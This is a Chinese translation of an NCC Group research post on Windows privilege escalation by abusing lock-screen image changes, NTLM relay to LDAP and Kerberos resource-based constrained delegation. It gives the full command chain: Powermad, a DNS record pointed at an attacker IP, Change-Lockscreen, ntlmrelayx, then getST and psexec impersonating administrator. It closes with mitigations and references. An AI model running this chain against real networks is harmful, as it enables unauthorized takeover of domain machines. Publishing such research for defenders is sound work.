**在最近一次的活动目录（Active
Directory）评估期间，我们以低权限用户的身份访问了一个完全修补且安全的域工作站。在尝试了许多不同的方法来提升本地权限后，我们发现了Elad
Shamir发表的一篇题为“Wagging the Dog：滥用基于资源的约束委派攻击活动目录”[1]的博文。**

该帖中提到了关于低权限用户可能滥用用户配置文件图像更改功能，从给定计算机实现作为SYSTEM的网络身份验证。然后，此身份验证将被中继到Active
Directory LDAP服务，以便为该特定计算机设置基于资源的约束委派[2]，这引起了我们的注意。

这似乎是一个有趣的方法，但这里有一个问题：攻击需要访问图形界面。不幸的是，我们获取的是一个反向shell，还没有找到一种可以安全访问图形界面的方法。因此，我们必须摆脱对GUI的依赖。

## Objective

本文的目的是向大家展示，如何在打满补丁的Win10域主机上绕过图形接口依赖实现本地提权。你可能已经注意到了[1]，这种攻击并不新鲜，但我们已经删除了它的一些依赖项，同时我们也已自动化了该过程，以简化我们的操作过程。

## 攻击条件

截至本文撰写，攻击者仍需满足以下条件，才能使用此技术妥协Active Directory计算机对象：

 **具有至少一个ServicePrincipalName (SPN)的帐户。** 此帐户将被配置为受害者系统上的“允许代表其他身份（Allowed To
Act On Behalf Of Other Identity）”，并将用于调用S4U2self和S4U2proxy协议。

 **必须在受害计算机上安装WebDAV Redirector功能。** 这是因为WebDAV客户端不协商签名，因此允许身份验证中继到LDAP。

SMB中继可以使用最近发现的signing/MIC NTLM绕过来实现，但这已被微软修复了。[6] [7]

 **指向攻击者计算机的DNS记录。** WebDAV客户端将仅自动向Intranet区域中的主机进行身份验证。这意味着使用IP而非主机名是行不通的。

 **访问GUI以使用“Create your picture -- > Browse for
one”功能。**其中一个步骤是由System（因此，计算机帐户在网络中）完成的，并且可以指定WebDAV路径（\\\maliciousWebDav@80\pics\pic.jpg）

以下信息对尝试满足上述依赖非常有用：

1\. 默认的Active Directory ms-DS-MachineAccountQuota属性，允许所有域用户向域中添加最多10个计算机帐户[4]。另外，计算机帐户具有其SPN属性的值，因此允许使用S4U协议。

![1.png](https://image.3001.net/images/20190831/1567208773_5d69b54547f16.png!small)

2\. 在Windows 10上，默认情况下已安装WebDAV客户端。在Windows Server
2012R2及更早版本中，需要桌面体验功能（Desktop Experience feature ）。 在Windows Server
2016及更高版本上，必须手动安装WebDAV Redirector 功能。

![2.png](https://image.3001.net/images/20190831/1567208787_5d69b5531dff5.png!small)

3\. 默认情况下，经过身份验证的用户在Active
Directory集成DNS（ADIDNS）区域中，具有“创建所有子对象”ACL。这样可以创建新的DNS记录。

![3.png](https://image.3001.net/images/20190831/1567208799_5d69b55f8d122.png!small)

前三个条件很容易满足，因为它们代表了默认的Active
Directory和Windows配置。但是，GUI的依赖在我们的场景中着实是一个令人感到沮丧的限制。

## 通过命令行更改图像

作为第一种方法，我们研究了使用API或Windows命令实用程序来更改配置文件图像 -但并没有成功。然而，我们发现了通过对锁屏图像的操作可以暴露出相同的攻击路径。

以下截图说明了这一点。

![4.png](https://image.3001.net/images/20190831/1567208817_5d69b57156c5e.png!small)

 **注意：** 在发表这篇文章前几天，Elad Shamir发表文章称他还发现了这个锁屏图像攻击路径。有关他的研究可以在[12]中找到。

在研究锁屏图像功能时，我们发现在本例中，可以使用API来执行锁屏图像更改[3]。使用这个API，我们最终通过命令行实现了SYSTEM网络身份验证。

编写PowerShell脚本和C#程序集以利用此API。我们调用了实用程序Change-Lockscreen，它可以在以下链接中找到：

<https://github.com/nccgroup/Change-Lockscreen>

使用此工具，指示提供图像的WebDAV的路径，Change-Lockscreen将执行导致所需网络身份验证的操作。

请注意，默认情况下，Windows 10具有一个名为Windows Spotlight的功能。此功能会自动下载并显示锁屏图像。启用此功能后，Change-Lockscreen将禁用它，并建立参数中指定的图像（尝试使用opsec）。但是，如果用户设置了一个静态的、自定义的锁屏图像而不是使用Spotlight，则Change-Lockscreen将备份该图像，并在攻击完成后将其放回原位。

## 演示视频：

## 在Impacket中实施攻击

最初，我们使用3xocyte（与Elad
Shamir合作）开发的rbcd_relay.py委托中继工具[5]。虽然这在我们的一些测试场景中非常有用，但它并没有涵盖我们所需的一切。因此，我们决定通过执行pull请求，在3xcely的工作和SecureAuth的Impacket项目[13]中添加我们自己的内容。

我们向ntlmrelayx添加了一个名为--serve-image的新标志。使用此标志，ntlmrelayx将提供指定的图像以满足攻击的目的。

此外，为了利用WebDAV的服务器功能，有必要在httprelayserver.py中实现OPTIONS和PROPFIND方法。OPTIONS方法用于通知客户端支持并启用PROPFIND方法。它是PROPFIND请求，其中包括NTLM身份验证，因此这个请求将被中继以执行攻击（示例请求如下图所示）。

![5.png](https://image.3001.net/images/20190831/1567208851_5d69b5935c34e.png!small)

示例用法如下：

    
    
    ntlmrelayx.py -t ldap://dc01.capsule.corp --delegate-access --escalate-user machine$ --serve-image ./spot.jpg

这些功能已经在Impacket中合并，你可以在以下位置找到：

<https://github.com/SecureAuthCorp/impacket>

## PoC

以下是有关使用Change-Lockscreen和ntlmrelayx攻击的视频演示：

以下步骤对应于上述视频内容：

1\. 我们需要一个具有ServicePrincipalName属性值的帐户，才能调用S4U2Self和S4U2Proxy。我们可以滥用默认的Active
Directory ms-DS-MachineAccountQuota属性，将计算机帐户添加到域中并使用它（Powermad [11]）。

    
    
    $pass = ConvertTo-SecureString ‘NCC1234!’ -AsPlainText -Force ; New-MachineAccount –MachineAccount s4umachine -Password $pass

2\. 我们必须创建一个指向攻击者机器（攻击者IP）的DNS记录（ImageServer.capsule.corp）。

    
    
    $cred = New-Object System.Management.Automation.PSCredential (“CAPSULE\s4umachine”, $pass); Invoke-DNSUpdate -DNSType A -DNSName ImageServer.capsule.corp -DNSData 10.10.11.137 -Credential $cred -Realm capsule.corp

3\. 我们通过使用low-priv用户来更改锁屏图像来触发Fileserver的网络身份验证。

    
    
    Change-Lockscreen –Webdav \\imageserver@80\

4\. 使用ntlmrelayx，身份验证将中继到LDAP。这允许我们修改机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性。

    
    
    Ntlmrelayx.py -t ldap://dc01.capsule.corp --delegate-access --escalate-user s4umachine$ --serve-image ./spot.jpg

5\. 现在，我们可以使用受信任的计算机（S4UMachine$）模拟文件服务器上任意服务的任意用户。

    
    
    getST.py capsule\s4umachine:’NCC1234!’@fileserver.capsule.corp -spn cifs/fileserver.capsule.corp -impersonate administrator -dc-ip 10.10.11.128
    Export KRB5CCNAME=administrator.ccache
    Psexec.py -k -no-pass fileserver.capsule.corp

以下短视频以图形、概念化的方式向大家展示了攻击中涉及的各个步骤。

## 缓解和检测

以下几点有助于缓解和检测此类攻击：

> 由于此攻击依赖于能够为自身配置基于Kerberos资源的约束委派的计算机，因此拒绝自己写入msDS-> AllowedToActOnBehalfOfOtherIdentity属性的计算机上的新ACE，将有助于缓解此攻击面。
>
> 对msDS-AllowedToActOnBehalfOfOtherIdentity属性，实施适当的SACL将有助于检测对此功能的修改。
>
> 最后，通过channel绑定启用LDAP签名，可以缓解使用此攻击执行的身份验证中继。

有关此主题的完整详细说明，请参阅Wagging the Dog [1]。

## 参考文献

>   1. <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
>   2. <https://docs.microsoft.com/en-us/windows-> server/security/kerberos/kerberos-constrained-delegation-overview>
>   3. <https://docs.microsoft.com/en-> us/uwp/api/windows.system.userprofile.lockscreen>
>   4. <https://docs.microsoft.com/es-es/windows/desktop/adschema/a-ms-ds-> machineaccountquota>
>   5. <https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c>
>   6. <https://blog.preempt.com/drop-the-mic>
>   7. <https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-> for-rce-and-domain-admin/>
>   8. <https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-> delegation/>
>   9. <http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-> the-dog-computer-takeover/>
>   10. <https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/>
>   11. <https://github.com/Kevin-Robertson/Powermad>
>   12. <https://shenaniganslabs.io/2019/08/08/Lock-Screen-LPE.html>
>   13. <https://github.com/SecureAuthCorp/impacket>
>

***参考来源：[nccgroup](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

